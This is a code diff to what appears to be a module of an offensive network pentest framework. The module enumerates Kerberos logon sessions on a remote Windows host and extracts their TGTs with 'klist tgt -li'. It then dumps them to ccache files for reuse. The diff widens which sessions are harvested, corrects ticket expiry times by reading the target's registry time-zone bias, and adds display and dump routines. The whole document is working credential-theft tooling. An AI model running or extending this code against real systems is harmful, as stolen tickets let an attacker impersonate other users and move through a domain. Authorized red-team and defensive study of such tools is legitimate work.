@@ -1,4 +1,5 @@
 import contextlib
+import os
 import re
 import struct
 from datetime import datetime, UTC
@@ -16,10 +17,11 @@ MACHINE_LOGON_IDS = {"0x3e7", "0x3e4"}
 
 
 def parse_klist_sessions(text):
-    """Keep only sessions that can hold a usable TGT: Kerberos interactive logons
-    and the machine account's own sessions (SYSTEM, NETWORK SERVICE). DWM and
-    other GUI pseudo-accounts are Negotiate:Interactive, so requiring the Kerberos
-    prefix drops them.
+    """Keep only sessions that can hold a usable TGT: Kerberos logons other than
+    network ones (interactive, service, batch...) and the machine account's own
+    sessions (SYSTEM, NETWORK SERVICE). DWM and other GUI pseudo-accounts are
+    Negotiate:Interactive, so requiring the Kerberos prefix drops them. Network
+    logons never cache a TGT, so they are the only Kerberos type dropped.
     """
     sessions = []
     seen = set()
@@ -33,9 +35,9 @@ def parse_klist_sessions(text):
         session_type = match.group(3).strip()
         if not logon_hex or not account:
             continue
-        interactive = session_type.startswith("Kerberos:") and "Interactive" in session_type
+        kerberos = session_type.startswith("Kerberos:") and session_type != "Kerberos:Network"
         machine = logon_hex.lower() in MACHINE_LOGON_IDS
-        if not (interactive or machine):
+        if not (kerberos or machine):
             continue
         if logon_hex in seen:
             continue
@@ -58,15 +60,32 @@ def select_sessions(sessions, selection):
     return [sessions[i - 1] for i in indices], None
 
 
+def get_target_utc_bias(run_cmd, logger):
+    """Minutes to add to the target's local time to get UTC (UTC = local + ActiveTimeBias).
+    klist prints local wallclock with no zone, so without this the ccache times and the
+    expiry check are off by the target's UTC offset whenever it differs from ours.
+    """
+    output = run_cmd(r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v ActiveTimeBias')
+    match = re.search(r"ActiveTimeBias\s+REG_DWORD\s+0x([0-9a-fA-F]+)", output) if output else None
+    if not match:
+        logger.debug("Could not read ActiveTimeBias, assuming target is in UTC")
+        return 0
+    value = int(match.group(1), 16)
+    if value >= 0x80000000:  # DWORD two's complement: east-of-UTC biases are negative
+        value -= 0x100000000
+    return value
+
+
 def collect_tgts(sessions, run_cmd, logger):
-    now = now_ticket_frame()
+    bias_minutes = get_target_utc_bias(run_cmd, logger)
+    now = datetime.now(UTC).timestamp()
     tgts = []
     for logon_hex, account in sessions:
         tgt_text = run_cmd(f"klist tgt -li {logon_hex}")
         if not tgt_text:
             logger.debug(f"{account} ({logon_hex}): no output from klist tgt")
             continue
-        info = parse_klist(tgt_text)
+        info = parse_klist(tgt_text, bias_minutes)
         if not info["ticket_data"]:
             logger.debug(f"{account} ({logon_hex}): no TGT in cache")
             continue
@@ -79,12 +98,12 @@ def collect_tgts(sessions, run_cmd, logger):
             if not (renew_till and renew_till > now):
                 logger.fail(f"{account} ({logon_hex}): expired, skipping")
                 continue
-            logger.display(f"{account} ({logon_hex}): expired but still renewable")
+            logger.debug(f"{account} ({logon_hex}): expired but still renewable")
         tgts.append((logon_hex, account, info))
     return tgts
 
 
-def parse_klist(text):
+def parse_klist(text, bias_minutes=0):
 
     def field(pattern, default=""):
         match = re.search(pattern, text, re.IGNORECASE)
@@ -95,7 +114,8 @@ def parse_klist(text):
             return 0
         for time_format in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
             with contextlib.suppress(ValueError):
-                return int(datetime.strptime(time_str.strip(), time_format).replace(tzinfo=UTC).timestamp())
+                local = int(datetime.strptime(time_str.strip(), time_format).replace(tzinfo=UTC).timestamp())
+                return local + bias_minutes * 60  # local wallclock -> true UTC epoch
         return 0
 
     ticket_hex = [re.sub(r"[^0-9a-fA-F]", "", match.group(1)) for match in re.finditer(r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE)]
@@ -207,11 +227,49 @@ def fmt_ticket_time(timestamp):
     return datetime.fromtimestamp(timestamp, tz=UTC).strftime("%Y-%m-%d %H:%M:%S")
 
 
-def now_ticket_frame():
-    # parse_klist tags klist's local wallclock as UTC, so build "now" the same way to compare in the same frame.
-    return datetime.now().replace(tzinfo=UTC).timestamp()
-
-
 def ccache_path(prefix, client, realm, logon_hex):
     safe_name = re.sub(r"[^\w@.-]", "_", f"{client}@{realm}_{logon_hex}")
     return f"{prefix}_{safe_name}.ccache"
+
+
+def klist_display(conn):
+    output = conn.execute("klist sessions", True)
+    if not output:
+        conn.logger.fail("Failed to enumerate Kerberos sessions")
+        return
+    sessions = parse_klist_sessions(output)
+    tgts = collect_tgts(sessions, lambda cmd: conn.execute(cmd, True), conn.logger)
+    if not tgts:
+        conn.logger.fail("No Kerberos TGTs found")
+        return
+    conn.logger.success(f"Found {len(tgts)} TGT(s)")
+    width = max(len(account) for _, account, _ in tgts)
+    for i, (logon_hex, account, info) in enumerate(tgts, 1):
+        conn.logger.highlight(f"  [{i}] {account:<{width}}  {logon_hex}  (expires {fmt_ticket_time(info['end_time'])} UTC)")
+
+
+def klist_dump_ccaches(conn, selection):
+    output = conn.execute("klist sessions", True)
+    if not output:
+        conn.logger.fail("Failed to enumerate Kerberos sessions")
+        return
+    sessions = parse_klist_sessions(output)
+    tgts = collect_tgts(sessions, lambda cmd: conn.execute(cmd, True), conn.logger)
+    tgts, error = select_sessions(tgts, selection)
+    if error:
+        conn.logger.fail(error)
+        return
+    if not tgts:
+        conn.logger.fail("No valid TGTs dumped")
+        return
+
+    output_prefix = conn.output_file_template.format(output_folder="klist")
+    os.makedirs(os.path.dirname(output_prefix), exist_ok=True)
+
+    written = []
+    for logon_hex, account, info in tgts:
+        path = ccache_path(output_prefix, info["client"], info["realm"], logon_hex)
+        write_ccache(info, path)
+        written.append(path)
+        conn.logger.highlight(f"{account}  (expires {fmt_ticket_time(info['end_time'])} UTC)")
+    conn.logger.success(f"Dumped {len(written)} TGT(s) to {os.path.dirname(output_prefix)}")
